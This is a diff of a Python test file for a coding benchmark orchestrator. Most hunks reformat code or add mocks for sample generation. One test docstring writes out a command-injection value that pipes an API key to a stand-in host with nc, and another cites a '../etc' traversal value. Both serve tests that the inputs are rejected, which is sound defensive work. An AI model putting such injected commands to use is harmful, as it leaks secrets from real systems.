@@ -152,18 +152,14 @@ def test_merge_dataset_results_missing_key_raises() -> None:
         "",  # empty
     ],
 )
-def test_build_specs_rejects_hostile_model_ids(
-    tmp_path: pathlib.Path, hostile_model: str
-) -> None:
+def test_build_specs_rejects_hostile_model_ids(tmp_path: pathlib.Path, hostile_model: str) -> None:
     """B-review-F1+F5: shell metacharacters or leading '-' in target model IDs must be rejected
     at build_specs boundary. Without the fix, target=`x; cat $KEY | nc evil #` exfiltrates the
     OpenRouter key inside the pool orchestrator's shell (network is open for the real OR call,
     so bwrap --unshare-net doesn't block egress).
     """
     with pytest.raises(ValueError, match="unsafe model id"):
-        build_specs(
-            target_models=[hostile_model], datasets=["humaneval"], work_dir=tmp_path
-        )
+        build_specs(target_models=[hostile_model], datasets=["humaneval"], work_dir=tmp_path)
 
 
 @pytest.mark.parametrize(
@@ -177,17 +173,13 @@ def test_build_specs_rejects_hostile_model_ids(
         "",  # empty
     ],
 )
-def test_build_specs_rejects_hostile_datasets(
-    tmp_path: pathlib.Path, hostile_ds: str
-) -> None:
+def test_build_specs_rejects_hostile_datasets(tmp_path: pathlib.Path, hostile_ds: str) -> None:
     """B-review-F2: `ds` traversal + shell-injection guard. Without the fix, ds=`../etc`
     creates `work_dir/target/../etc` = `work_dir/etc` and sets owned_paths OUTSIDE the
     intended per-unit tree, defeating disjoint-owned-paths isolation.
     """
     with pytest.raises(ValueError, match="unsafe dataset"):
-        build_specs(
-            target_models=["good/model"], datasets=[hostile_ds], work_dir=tmp_path
-        )
+        build_specs(target_models=["good/model"], datasets=[hostile_ds], work_dir=tmp_path)
 
 
 def test_build_specs_quotes_shell_special_chars_defensively(
@@ -220,9 +212,7 @@ def test_build_specs_quotes_shell_special_chars_defensively(
                 if ch == "'":
                     in_quote = not in_quote
                 elif ch == bad[0] and not in_quote:
-                    raise AssertionError(
-                        f"unquoted {bad!r} in shell command: {shell_cmd!r}"
-                    )
+                    raise AssertionError(f"unquoted {bad!r} in shell command: {shell_cmd!r}")
 
 
 # ─── Phase C fixtures + helpers ────────────────────────────────────────────────
@@ -258,9 +248,7 @@ def _make_agents_db(tmp_path: pathlib.Path) -> pathlib.Path:
             (datetime.now(UTC).date() - timedelta(days=90)).isoformat(),
         ),
     )
-    conn.execute(
-        "INSERT INTO agents (id) VALUES (?)", ("bytedance-seed/seed-2.0-lite",)
-    )
+    conn.execute("INSERT INTO agents (id) VALUES (?)", ("bytedance-seed/seed-2.0-lite",))
     conn.commit()
     conn.close()
     return db
@@ -386,8 +374,7 @@ def test_main_skips_fresh_model_without_force(
     stdout = io.StringIO()
     with redirect_stdout(stdout):
         rc = main(
-            ["--models", "bytedance-seed/seed-2.0-mini", "--datasets", "humaneval",
-             "--dry-run"]
+            ["--models", "bytedance-seed/seed-2.0-mini", "--datasets", "humaneval", "--dry-run"]
         )
     out = stdout.getvalue()
     assert rc == 0
@@ -452,7 +439,9 @@ def test_main_dry_run_does_not_dispatch(
         )
     out = stdout.getvalue()
     assert rc == 0
-    assert dispatch_calls == [], f"run_agents SHOULD NOT have been called in dry-run: {dispatch_calls}"
+    assert dispatch_calls == [], (
+        f"run_agents SHOULD NOT have been called in dry-run: {dispatch_calls}"
+    )
     assert "DRY RUN" in out
     assert out.rstrip().splitlines()[-1] == "TOTAL_SPEND_USD: 0.00"
 
@@ -504,13 +493,47 @@ def test_main_emits_total_spend_regex_on_happy_path(
         cwd = pathlib.Path(kw.get("cwd", "."))
         results_dir = cwd / "results"
         results_dir.mkdir(parents=True, exist_ok=True)
-        (results_dir / "eval_results.json").write_text(json.dumps({
-            "date": "2026-07-10",
-            "hash": "test",
-            "eval": {"HumanEval/0": [{"base_status": "pass", "plus_status": "pass"}]},
-        }))
+        (results_dir / "eval_results.json").write_text(
+            json.dumps(
+                {
+                    "date": "2026-07-10",
+                    "hash": "test",
+                    "eval": {"HumanEval/0": [{"base_status": "pass", "plus_status": "pass"}]},
+                }
+            )
+        )
         return _sub.CompletedProcess(cmd, 0, b"stdout", b"")
 
+    monkeypatch.setattr(microbench_coding.subprocess, "run", _fake_subprocess_run)
+
+    def _fake_generate_samples(model, problems, out_path, **kw):
+        p = pathlib.Path(out_path)
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_text(
+            "\n".join(json.dumps({"task_id": tid, "solution": "pass\n"}) for tid in problems) + "\n"
+        )
+        return p, 0.05
+
+    def _fake_subprocess_run(cmd, **kw):
+        import subprocess as _sub
+
+        cwd = pathlib.Path(kw.get("cwd", "."))
+        results_dir = cwd / "results"
+        results_dir.mkdir(parents=True, exist_ok=True)
+        (results_dir / "eval_results.json").write_text(
+            json.dumps(
+                {
+                    "date": "2026-07-10",
+                    "hash": "test",
+                    "eval": {"HumanEval/0": [{"base_status": "pass", "plus_status": "pass"}]},
+                }
+            )
+        )
+        return _sub.CompletedProcess(cmd, 0, b"stdout", b"")
+
+    monkeypatch.setattr(
+        microbench_coding.openrouter_complete, "generate_samples", _fake_generate_samples
+    )
     monkeypatch.setattr(microbench_coding.subprocess, "run", _fake_subprocess_run)
 
     stdout = io.StringIO()
@@ -528,7 +551,7 @@ def test_main_emits_total_spend_regex_on_happy_path(
     last_line = stdout.getvalue().rstrip().splitlines()[-1]
     import re as _re
 
-    # E4 regex tolerates any float value (post-refactor, this is 0.00)
+    # E4 regex — post-2-step-refactor, total_spend = 2 units × 0.05 = 0.10
     assert _re.match(r"^TOTAL_SPEND_USD: [0-9]+\.[0-9]+$", last_line), last_line
 
 
@@ -575,15 +598,28 @@ def test_main_writes_correct_model_id_end_to_end(
 
     fixture_shape = json.loads(FIXTURE_PATH.read_text())
 
+    def _fake_generate_samples(model, problems, out_path, **kw):
+        # plan-3 2-step: shim generates completions → returns (path, cost)
+        p = pathlib.Path(out_path)
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_text(
+            "\n".join(json.dumps({"task_id": tid, "solution": "pass\n"}) for tid in problems) + "\n"
+        )
+        return p, 0.11
+
     def _fake_subprocess_run(cmd, **kw):
         import subprocess as _sub
 
         cwd = pathlib.Path(kw.get("cwd", "."))
+        # Shape-matching eval_results.json (evalplus writes it next to samples.jsonl OR under cwd)
         results_dir = cwd / "results"
         results_dir.mkdir(parents=True, exist_ok=True)
         (results_dir / "eval_results.json").write_text(json.dumps(fixture_shape))
         return _sub.CompletedProcess(cmd, 0, b"", b"")
 
+    monkeypatch.setattr(
+        microbench_coding.openrouter_complete, "generate_samples", _fake_generate_samples
+    )
     monkeypatch.setattr(microbench_coding.subprocess, "run", _fake_subprocess_run)
 
     stdout = io.StringIO()
@@ -674,15 +710,20 @@ def test_main_dedups_duplicate_datasets(
     assert "would dispatch 2 units" in out, out
 
 
-@pytest.mark.parametrize("bad_flag,bad_val", [
-    ("--cost-cap", "-1"),
-    ("--cost-cap", "0"),
-    ("--ttl-days", "-5"),
-    ("--ttl-days", "0"),
-])
+@pytest.mark.parametrize(
+    "bad_flag,bad_val",
+    [
+        ("--cost-cap", "-1"),
+        ("--cost-cap", "0"),
+        ("--ttl-days", "-5"),
+        ("--ttl-days", "0"),
+    ],
+)
 def test_main_rejects_nonpositive_cost_cap_and_ttl(
-    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch,
-    bad_flag: str, bad_val: str,
+    tmp_path: pathlib.Path,
+    monkeypatch: pytest.MonkeyPatch,
+    bad_flag: str,
+    bad_val: str,
 ) -> None:
     """F5 regression: --cost-cap and --ttl-days must be > 0; anything else → exit 1."""
     db = _make_agents_db(tmp_path)
